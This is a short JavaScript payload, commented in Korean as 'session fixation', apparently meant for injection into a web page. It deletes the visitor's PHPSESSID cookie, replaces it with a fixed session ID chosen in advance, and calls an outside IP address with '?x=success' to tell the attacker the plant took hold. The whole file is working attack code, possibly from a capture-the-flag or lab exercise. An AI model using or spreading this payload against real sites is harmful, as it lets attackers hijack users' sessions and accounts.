// 세션 고정
async function session() {
    if (!document.cookie.includes("PHPSESSID=cr7lmg0e1i0kh0dctupdonq34j")) {
        document.cookie = "PHPSESSID=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        document.cookie = "PHPSESSID=cr7lmg0e1i0kh0dctupdonq34j; path=/;";
        await fetch("http://101.101.208.9?x=success");
    } else {
        return;
    }
}

session();

